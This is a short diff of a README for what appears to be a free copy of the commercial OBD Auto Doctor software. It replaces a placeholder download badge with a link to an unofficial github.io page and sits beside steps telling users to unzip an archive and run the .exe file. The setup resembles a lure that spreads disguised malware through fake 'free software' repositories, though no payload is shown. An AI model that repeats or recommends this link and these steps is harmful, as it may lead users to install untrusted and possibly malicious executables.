@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://obd-auto-doctor-free.github.io/.github/)
 
 ## 📸 Overview
  <img width="2560" height="1440" alt="obd-auto-doctor-dashboard-overview" src="https://github.com/user-attachments/assets/f8165153-9280-493c-b46c-ddffe402fc00" />
